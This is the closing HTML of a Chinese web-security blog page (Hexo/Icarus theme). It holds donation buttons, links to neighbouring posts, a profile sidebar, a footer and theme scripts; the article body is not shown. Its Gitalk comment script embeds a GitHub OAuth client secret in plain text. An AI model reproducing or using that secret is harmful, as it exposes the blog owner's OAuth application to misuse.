is-centered"><a class="button donate" href="https://afdian.net/u/160040b2960e11ec85c252540025c377" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>爱发电</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/alipay.jpg" alt="支付宝"></span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/wechat.jpg" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/02/03/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/mysql-config/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">mysql中常用的配置操作</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/01/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/php-code-audit/php-audit-74cmsssti-readfile/"><span class="level-item">74cm模板注入任意文件读取漏洞分析</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div id="comment-container"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script><script>var gitalk = new Gitalk({
            id: "05a63ec38e44631fc88db80e5ac57469",
            repo: "blogcomment",
            owner: "Greetdawn",
            clientID: "c1cf74deaf58fdb145db",
            clientSecret: "325dbaf6fb679640f70f542707c58778f3e23f8f",
            admin: ["Greetdawn"],
            createIssueManually: false,
            distractionFreeMode: false,
            perPage: 20,
            pagerDirection: "last",
            
            
            enableHotKey: true,
            language: "zh-CN",
        })
        gitalk.render('comment-container')</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1 is-sticky"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.png" alt="greetdawn"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">greetdawn</p><p class="is-size-6 is-block">Web Security</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Singapore</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">45</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">12</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">44</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/Greetdawn" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/Greetdawn"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">greetdawn&#039;s Site</a><p class="is-size-7"><span>&copy; 2022 丨greetdawn丨</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">共<span id="busuanzi_value_site_uv">0</span>个访客</span></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/Greetdawn"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>